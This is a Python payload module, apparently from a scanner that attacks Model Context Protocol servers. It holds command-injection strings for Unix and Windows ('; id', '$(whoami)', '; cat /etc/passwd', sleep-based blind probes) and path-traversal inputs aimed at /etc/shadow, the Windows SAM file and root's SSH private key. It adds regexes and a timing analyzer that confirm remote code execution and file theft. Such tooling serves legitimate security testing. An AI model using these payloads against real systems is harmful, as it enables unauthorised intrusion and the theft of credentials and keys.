"""MCP Attack Payloads - Semantic exploitation vectors"""
import re
import statistics

# Prioritized payload categories (RCE first)
PAYLOAD_PRIORITY = ['command_injection']

# Quick RCE-only mode payloads
RCE_QUICK_PAYLOADS = [
    '; id', '| id', '$(id)', '`id`',
    '; whoami', '| whoami',
    '& whoami', '&& whoami',
    '; sleep 10', '$(sleep 10)',
]

PAYLOADS = {
    'command_injection': [
        # Unix RCE - fast detection
        '; id', '| id', '`id`', '$(id)',
        '; whoami', '| whoami', '`whoami`', '$(whoami)',
        '; uname -a', '| uname -a',
        # Windows RCE
        '& whoami', '&& whoami', '| whoami',
        '& ver', '&& ver',
        # Newline injection
        '\nid', '\nwhoami', '\nuname -a',
        # Blind RCE (timing)
        '; sleep 10', '| sleep 10', '`sleep 10`', '$(sleep 10)',
        '& timeout 10', '&& timeout 10',
        # File read for RCE confirmation
        '; cat /etc/passwd', '| cat /etc/passwd',
        '$(cat /etc/passwd)', '`cat /etc/passwd`',
    ],
    'path_traversal': [
        '../../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/shadow', '....//....//etc/passwd',
        '/etc/passwd', 'C:\\Windows\\System32\\config\\SAM',
        '../../../../../../root/.ssh/id_rsa'
    ],
}

# Pre-compiled regex patterns for RCE detection
INDICATORS = {
    'rce_success': [
        # Unix command output
        re.compile(r'uid=\d+\([^)]+\)'),  # id output
        re.compile(r'gid=\d+\([^)]+\)'),
        re.compile(r'groups=\d+'),
        re.compile(r'root:.*:0:0'),  # /etc/passwd
        re.compile(r'\broot\b.*\b/bin/bash'),
        re.compile(r'Linux.*\d+\.\d+\.\d+'),  # uname -a
        re.compile(r'GNU/Linux'),
        # Windows command output
        re.compile(r'COMPUTERNAME=', re.IGNORECASE),
        re.compile(r'USERNAME=', re.IGNORECASE),
        re.compile(r'Windows.*Version', re.IGNORECASE),
        re.compile(r'Microsoft Windows', re.IGNORECASE),
        re.compile(r'C:\\Windows', re.IGNORECASE),
        re.compile(r'C:\\Users', re.IGNORECASE),
    ],
    'file_read': [
        re.compile(r'root:x:'),
        re.compile(r'-----BEGIN'),
        re.compile(r'\[boot loader\]'),
        re.compile(r'PRIVATE KEY'),
    ]
}


class TimingAnalyzer:
    """Statistical timing analysis for blind RCE detection"""
    def __init__(self):
        self.baseline_times = []
        self.threshold_sigma = 3
        self.blind_rce_threshold = 8.0  # sleep 10 detection

    def add_baseline(self, elapsed_time):
        """Record baseline timing"""
        self.baseline_times.append(elapsed_time)

    def is_anomaly(self, elapsed_time):
        """Detect timing anomaly (blind RCE via sleep)"""
        # Absolute threshold for sleep-based RCE
        if elapsed_time > self.blind_rce_threshold:
            return True
        
        # Statistical deviation for subtle delays
        if len(self.baseline_times) < 3:
            return False

        try:
            avg = statistics.mean(self.baseline_times)
            stdev = statistics.stdev(self.baseline_times)
            if stdev == 0:
                return elapsed_time > avg * 2  # Fallback heuristic
            return elapsed_time > avg + (self.threshold_sigma * stdev)
        except statistics.StatisticsError:
            return False
